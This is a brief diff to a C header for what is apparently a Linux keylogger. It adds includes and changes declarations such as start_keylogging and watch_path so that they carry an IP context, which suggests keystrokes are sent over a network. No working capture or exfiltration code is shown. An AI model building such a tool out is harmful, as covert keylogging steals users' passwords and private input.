@@ -5,6 +5,8 @@
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <libgen.h>
+#include <limits.h>
 #include <linux/input.h>
 #include <pthread.h>
 #include <signal.h>
@@ -15,6 +17,7 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/select.h>
+#include <sys/stat.h>
 #include <sys/time.h>
 #include <unistd.h>
 
@@ -57,7 +60,7 @@ typedef struct
     ip_info ip_ctx;
 } receiver_args_t;
 
-void watch_path(const char *path);
+void watch_path(ip_info ip_ctx, const char *path);
 int  start_keylogging(ip_info ip_ctx);
 
 #endif // KEYLOG_H
